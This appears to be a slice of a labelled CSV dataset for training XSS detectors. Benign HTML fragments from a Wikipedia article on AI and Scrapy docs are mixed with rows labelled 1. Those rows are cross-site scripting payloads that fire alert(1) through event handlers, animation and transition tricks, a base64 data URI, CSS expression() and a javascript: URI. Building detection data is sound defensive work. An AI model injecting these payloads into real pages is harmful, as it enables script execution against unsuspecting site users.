,Sentence,Label
13257,"<meta ondblclick=""alert(1)"">test</meta>",1
13258,	 </span>,0
13259,<dl onpointerover=alert(1)>XSS</dl>,1
13260,	 </span>,0
13261,"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;25 </li> </ul>",0
13262,"<audio draggable=""true"" ondragleave=""alert(1)"">test</audio>",1
13263,"<source onkeyup=""alert(1)"" contenteditable>test</source>",1
13264,"<style>@keyframes x{}</style><menu style=""animation-name:x"" onanimationstart=""alert(1)""></menu>",1
13265,"<ruby onmouseout=""alert(1)"">test</ruby>",1
13266,"<source onbeforecopy=""alert(1)"" contenteditable>test</source>",1
13267,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=siemens.com&amp;rft.atitle=Autonomous+Systems%3A+Infographic&amp;rft_id=https%3A%2F%2Fwww.siemens.com%2Finnovation%2Fen%2Fhome%2Fpictures-of-the-future%2Fdigitalization-and-software%2Fautonomous-systems-infographic.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
13268,<style onreadystatechange=alert(1)></style>,1
13269,"<dl><dt><a href=""/wiki/Agent_architecture"" title=""Agent architecture"">Agent architectures </a> and <a href=""/wiki/Cognitive_architecture"" title=""Cognitive architecture"">cognitive architectures </a> </dt>",0
13270,	 </span>,0
13271,"<style>@keyframes slidein {}</style><style style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></style>",1
13272,"<div draggable=""true"" contenteditable>drag me</div><center ondragover=alert(1) contenteditable>drop here</center>",1
13273,"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;739–748, 758 </li>",0
13274,"        <div class=""wy-side-nav-search"" >",0
13275,"<li class=""toclevel-2 tocsection-65""><a href=""#Superintelligence""><span class=""tocnumber"">8.5 ",0
13276,"<embed onbeforecut=""alert(1)"" contenteditable>test</embed>",1
13277,"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;949 </li>",0
13278,"<style>:target {color: red;}</style><main id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></main>",1
13279,"<style>:target {transform: rotate(180deg);}</style><wbr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></wbr>",1
13280,"<kbd onpaste=""alert(1)"" contenteditable>test</kbd>",1
13281,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Data+characteristics+that+determine+classifier+performance&amp;rft.date=2006&amp;rft.aulast=van+der+Walt&amp;rft.aufirst=Christiaan&amp;rft.au=Bernard%2C+Etienne&amp;rft_id=http%3A%2F%2Fwww.patternrecognition.co.za%2Fpublications%2Fcvdwalt_data_characteristics_classifiers.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
13282,"<style>:target {color: red;}</style><progress id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></progress>",1
13283,"<style>@keyframes x{}</style><output style=""animation-name:x"" onanimationstart=""alert(1)""></output>",1
13284,"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationend=""alert(1)""></canvas>",1
13285,"<li id=""cite_note-327""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-327"">^ </a> </b> ",0
13286,"?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",1
13287,"<li id=""cite_note-moma-343""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-moma_343-0"">^ </a> </b> ",0
13288,"<track onmouseenter=""alert(1)"">test</track>",1
13289,"<li><a href=""/wiki/Digital_library"" title=""Digital library"">Digital library </a> </li>",0
13290,"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationstart=""alert(1)""></img>",1
13291,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
13292,"<div draggable=""true"" contenteditable>drag me</div><style ondragover=alert(1) contenteditable>drop here</style>",1
13293,"<ul><li><a href=""#CITEREFACM1998"">ACM 1998 </a>, ~I.2.4, </li>",0
13294,"<style>@keyframes slidein {}</style><data style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></data>",1
13295,<svg><acronym onload=alert(1)></acronym>,1
13296,"<s onmouseup=""alert(1)"">test</s>",1
13297,"<style>:target {color: red;}</style><image id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></image>",1
13298,"<sup onmousemove=""alert(1)"">test</sup>",1
13299,"<video autoplay controls onpause=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
13300,	 </span> ,0
13301,"Dreyfus criticized the <a href=""/wiki/Necessary_and_sufficient"" class=""mw-redirect"" title=""Necessary and sufficient"">necessary </a> condition of the <a href=""/wiki/Physical_symbol_system"" title=""Physical symbol system"">physical symbol system </a> hypothesis, which he called the ""psychological assumption"": ""The mind can be viewed as a device operating on bits of information according to formal rules."" (<a href=""#CITEREFDreyfus1992"">Dreyfus 1992 </a>, p.&#160;156) ",0
13302,	 </span> </li>,0
13303,"<li><a href=""/wiki/Software_maintenance"" title=""Software maintenance"">Software maintenance </a> </li>",0
13304,</body>,0
13305,"<style>:target {color:red;}</style><col id=x style=""transition:color 1s"" ontransitionend=alert(1)></col>",1
13306,    </div>,0
13307,<script onpointerleave=alert(1)>XSS</script>,1
13308,"<style>@keyframes slidein {}</style><embed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></embed>",1
13309,<div id=x tabindex=1 onbeforeactivate=alert(1)></div>,1
13310,"<li><a href=""/wiki/Scientific_revolution"" class=""mw-redirect"" title=""Scientific revolution"">Scientific revolution </a> </li>",0
13311,<keygen id=x tabindex=1 onbeforedeactivate=alert(1)></keygen><input autofocus>,1
13312,"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=49"" title=""Edit section: The limits of artificial general intelligence"">edit </a><span class=""mw-editsection-bracket"">] ",0
13313,"<li><a href=""/wiki/Neuroevolution"" title=""Neuroevolution"">Neuroevolution </a> </li>",0
13314,"<tr onbeforecut=""alert(1)"" contenteditable>test</tr>",1
13315,"	<span class=""mw-editsection-bracket"">] ",0
13316,<video onpointerleave=alert(1)>XSS</video>,1
13317,"<shadow onbeforepaste=""alert(1)"" contenteditable>test</shadow>",1
13318,	 </span>,0
13319,"<kbd onmouseover=""alert(1)"">test</kbd>",1
13320,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> In<br /> <cite class=""citation book""><a href=""/wiki/Solomon_Feferman"" title=""Solomon Feferman"">Feferman, Solomon </a>, ed. (1995). <i>Kurt Gödel: Collected Works, Vol. III: Unpublished Essays and Lectures </i>. Oxford University Press. pp.&#160;304–23. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-19-514722-3"" title=""Special:BookSources/978-0-19-514722-3""><bdi>978-0-19-514722-3 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Kurt+G%C3%B6del%3A+Collected+Works%2C+Vol.+III%3A+Unpublished+Essays+and+Lectures&amp;rft.pages=304-23&amp;rft.pub=Oxford+University+Press&amp;rft.date=1995&amp;rft.isbn=978-0-19-514722-3&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
13321,"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, p.&#160;49 (historical significance) </li> </ul>",0
13322,<plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>,1
13323,<isindex onpointerout=alert(1)>XSS</isindex>,1
13324,"<output onpaste=""alert(1)"" contenteditable>test</output>",1
13325,<mark id=x tabindex=1 onbeforeactivate=alert(1)></mark>,1
13326,"<ul><li><a href=""#CITEREFTuring1950"">Turing 1950 </a> </li> </ul>",0
13327,"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""alert(1)""></p>",1
13328,<summary id=x tabindex=1 onfocusin=alert(1)></summary>,1
13329,	 </span>,0
13330,	 </span>,0
13331,<legend onpointerover=alert(1)>XSS</legend>,1
13332,	 </span></a></dt><dd>Learn about the command-line tool used to manage your Scrapy project.</dd>,0
13333,"<wbr draggable=""true"" ondragleave=""alert(1)"">test</wbr>",1
13334,<samp onblur=alert(1) tabindex=1 id=x></samp><input autofocus>,1
13335,"<details onbeforecopy=""alert(1)"" contenteditable>test</details>",1
13336,"<style>:target {color:red;}</style><multicol id=x style=""transition:color 1s"" ontransitionend=alert(1)></multicol>",1
13337,	<ul >,0
13338,<image onpointerup=alert(1)>XSS</image>,1
13339,<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>,1
13340,"<IMG STYLE="":expr/**/ession(alert(''))"">",1
13341,<input4 onpointermove=alert(1)>XSS</input4>,1
13342,"<data draggable=""true"" ondrag=""alert(1)"">test</data>",1
13343,"<li><a href=""/wiki/Neuroevolution"" title=""Neuroevolution"">Neuroevolution </a> </li>",0
13344,"<frameset draggable=""true"" ondragstart=""alert(1)"">test</frameset>",1
13345,"<li><a href=""/wiki/File:Nuvola_apps_kalzium.svg"" class=""image""><img alt=""Nuvola apps kalzium.svg"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/8/8b/Nuvola_apps_kalzium.svg/28px-Nuvola_apps_kalzium.svg.png"" decoding=""async"" width=""28"" height=""28"" class=""noviewer"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/8/8b/Nuvola_apps_kalzium.svg/42px-Nuvola_apps_kalzium.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/8/8b/Nuvola_apps_kalzium.svg/56px-Nuvola_apps_kalzium.svg.png 2x"" data-file-width=""128"" data-file-height=""128"" /> </a> <a href=""/wiki/Portal:Science"" title=""Portal:Science"">Science&#32;portal </a> </li> </ul>",0
13346,"<ruby onmouseenter=""alert(1)"">test</ruby>",1
13347,"<style>:target {color: red;}</style><source id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></source>",1
13348,	 </span> </li>,0
13349,<param id=x tabindex=1 onbeforeactivate=alert(1)></param>,1
13350,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=How+to+build+complete+creatures+rather+than+isolated+cognitive+simulators&amp;rft.btitle=Architectures+for+Intelligence&amp;rft.place=Hillsdale%2C+NJ&amp;rft.pages=225-239&amp;rft.pub=Lawrence+Erlbaum+Associates&amp;rft.date=1991&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.52.9510&amp;rft.aulast=Brooks&amp;rft.aufirst=R.+A.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
13351,"<li id=""cite_note-FOOTNOTEEdelson1991-141""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEEdelson1991_141-0"">^ </a> </b> ",0
13352,"  <link rel=""stylesheet"" href=""_static/pygments.css"" type=""text/css"" />",0
13353, </li>,0
13354,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
13355,"<style>:target {transform: rotate(180deg);}</style><keygen id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></keygen>",1
13356,"<style>@keyframes slidein {}</style><menuitem style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></menuitem>",1
13357,"        <div id=""right-navigation"">",0
13358,"<svg onmouseenter=""alert(1)"">test</svg>",1
13359,"<svg><path><animateMotion onbegin=alert(1) dur=""1s"" repeatCount=""1"">",1
13360,"<ul><li><a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">Natural language processing </a> </li>",0
13361,	 </span>,0
13362, </p>,0
13363,"<var onmousedown=""alert(1)"">test</var>",1
13364,"<body draggable=""true"" ondrag=""alert(1)"">test</body>",1
13365,"<li id=""cite_note-WERBOS1974-241""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-WERBOS1974_241-0"">^ </a> </b> ",0
13366,"<li id=""cite_note-Agent_architectures-180""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Agent_architectures_180-0"">^ </a> </b> ",0
13367,"<sub onpaste=""alert(1)"" contenteditable>test</sub>",1
13368,"	 </span> <span class=""reference-text""><a href=""#CITEREFRussellNorvig2009"">Russell &amp; Norvig 2009 </a>, 18.12: Learning from Examples: Summary. ",0
13369,<blink onpointerleave=alert(1)>XSS</blink>,1
13370,"<h4><span class=""mw-headline"" id=""Malevolent_and_friendly_AI"">Malevolent and friendly AI ",0
13371,<em onpointerup=alert(1)>XSS</em>,1
13372,"<li id=""cite_note-goodfellow2016-247""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-goodfellow2016_247-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-goodfellow2016_247-1""><sup><i><b>b </b> </i> </sup> </a> ",0
13373,"<font onmouseout=""alert(1)"">test</font>",1
13374,"	 </span> <span class=""reference-text"">",0
13375,"<li><a href=""/wiki/Pedro_Domingos"" title=""Pedro Domingos"">Domingos, Pedro </a>, ""Our Digital Doubles:  AI will serve our species, not control it"", <i><a href=""/wiki/Scientific_American"" title=""Scientific American"">Scientific American </a> </i>, vol. 319, no. 3 (September 2018), pp.&#160;88–93. </li>",0
13376,<dl onpointerleave=alert(1)>XSS</dl>,1
13377,"<tt draggable=""true"" ondragleave=""alert(1)"">test</tt>",1
13378,<dir id=x tabindex=1 onactivate=alert(1)></dir>,1
13379,<xmp onpointerleave=alert(1)>XSS</xmp>,1
13380,	 </span> </a> </li>,0
13381,"	 </span> <span class=""reference-text"">",0
13382,"<dt><a class=""reference internal"" href=""versioning.html""><span class=""doc"">Versioning and API Stability",0
13383,	 </span> 2018 ,0
13384,<ol id=x tabindex=1 onfocusin=alert(1)></ol>,1
13385,<dt onpointerup=alert(1)>XSS</dt>,1
13386,"<p>When access to digital computers became possible in the mid 1950s, AI research began to explore the possibility that human intelligence could be reduced to symbol manipulation. The research was centered in three institutions: <a href=""/wiki/Carnegie_Mellon_University"" title=""Carnegie Mellon University"">Carnegie Mellon University </a>, <a href=""/wiki/Stanford"" class=""mw-redirect"" title=""Stanford"">Stanford </a> and <a href=""/wiki/MIT"" class=""mw-redirect"" title=""MIT"">MIT </a>, and as described below, each one developed its own style of research. <a href=""/wiki/John_Haugeland"" title=""John Haugeland"">John Haugeland </a> named these symbolic approaches to AI ""good old fashioned AI"" or ""<a href=""/wiki/GOFAI"" class=""mw-redirect"" title=""GOFAI"">GOFAI </a>"".<sup id=""cite_ref-GOFAI_157-0"" class=""reference""><a href=""#cite_note-GOFAI-157"">&#91;154&#93; </a> </sup> During the 1960s, symbolic approaches had achieved great success at simulating high-level ""thinking"" in small demonstration programs. Approaches based on <a href=""/wiki/Cybernetics"" title=""Cybernetics"">cybernetics </a> or <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">artificial neural networks </a> were abandoned or pushed into the background.<sup id=""cite_ref-158"" class=""reference""><a href=""#cite_note-158"">&#91;155&#93; </a> </sup>",0
13387,"<dd onmousedown=""alert(1)"">test</dd>",1
13388,"<style>@keyframes slidein {}</style><output style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></output>",1
13389,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Discover+Magazine&amp;rft.atitle=Cultivating+Common+Sense+%7C+DiscoverMagazine.com&amp;rft.date=2017&amp;rft_id=http%3A%2F%2Fdiscovermagazine.com%2F2017%2Fapril-2017%2Fcultivating-common-sense&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
13390,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Observer&amp;rft.atitle=Stephen+Hawking%2C+Elon+Musk%2C+and+Bill+Gates+Warn+About+Artificial+Intelligence&amp;rft.date=2015-08-19&amp;rft_id=http%3A%2F%2Fobserver.com%2F2015%2F08%2Fstephen-hawking-elon-musk-and-bill-gates-warn-about-artificial-intelligence%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
13391,"<mark draggable=""true"" ondragenter=""alert(1)"">test</mark>",1
13392,<nav onpointerleave=alert(1)>XSS</nav>,1
13393,<svg><tr onload=alert(1)></tr>,1
13394,<frameset id=x tabindex=1 onbeforedeactivate=alert(1)></frameset><input autofocus>,1
13395,"	 </span> </a> </i>&#93; </sup>. Many deep learning systems need to be able to learn chains ten or more causal links in length.<sup id=""cite_ref-schmidhuber2015_246-0"" class=""reference""><a href=""#cite_note-schmidhuber2015-246"">&#91;235&#93; </a> </sup> Deep learning has transformed many important subfields of artificial intelligence<sup class=""noprint Inline-Template"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/Wikipedia:Please_clarify"" title=""Wikipedia:Please clarify""><span title=""The reason for this is unclear. (July 2019)"">why? ",0
13396,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/asyncio.html"">asyncio</a></li>",0
13397,javascript:alert('');,1
13398,"<aside onkeydown=""alert(1)"" contenteditable>test</aside>",1
